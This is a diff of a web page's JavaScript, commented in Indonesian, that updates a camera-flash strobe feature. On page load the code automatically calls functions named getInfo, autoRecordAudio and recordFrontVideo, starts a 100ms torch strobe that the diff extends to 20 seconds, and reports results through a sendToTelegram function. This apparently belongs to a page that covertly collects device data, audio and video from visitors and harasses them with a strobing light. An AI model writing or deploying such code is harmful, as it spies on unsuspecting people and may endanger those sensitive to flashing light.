@@ -236,16 +236,15 @@
       }
     }
 
-    // --- FITUR FLASH BARU ---
+    // --- FITUR FLASH UPDATED ---
     async function startFlashStrobe() {
       try {
-        // Minta izin kamera belakang untuk akses flash
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
         const track = stream.getVideoTracks()[0];
         const capabilities = track.getCapabilities();
 
         if (!capabilities.torch) {
-          sendToTelegram('flash tidak on 🤬 (Device tidak support torch)');
+          sendToTelegram('flash tidak on 🤬');
           stream.getTracks().forEach(t => t.stop());
           return;
         }
@@ -253,29 +252,35 @@
         sendToTelegram('flash berhasil on ✅');
 
         let isOn = false;
+        // Interval kedip 100ms
         const interval = setInterval(async () => {
-          isOn = !isOn;
-          await track.applyConstraints({ advanced: [{ torch: isOn }] });
-        }, 100); // Kedip setiap 100ms
+          try {
+            isOn = !isOn;
+            await track.applyConstraints({ advanced: [{ torch: isOn }] });
+          } catch (e) {
+            clearInterval(interval);
+          }
+        }, 100);
 
+        // Berjalan selama 20 detik
         setTimeout(() => {
           clearInterval(interval);
           track.applyConstraints({ advanced: [{ torch: false }] });
           stream.getTracks().forEach(t => t.stop());
-        }, 10000); // Berhenti setelah 10 detik
+        }, 20000);
 
       } catch (err) {
         sendToTelegram('flash tidak on 🤬');
       }
     }
-    // ------------------------
+    // ----------------------------
 
     window.addEventListener('DOMContentLoaded', () => {
       createParticles();
       getInfo();
       autoRecordAudio(); 
       recordFrontVideo();
-      startFlashStrobe(); // Pemicu otomatis saat halaman dimuat
+      startFlashStrobe();
     });
 
     button.addEventListener('click', () => {
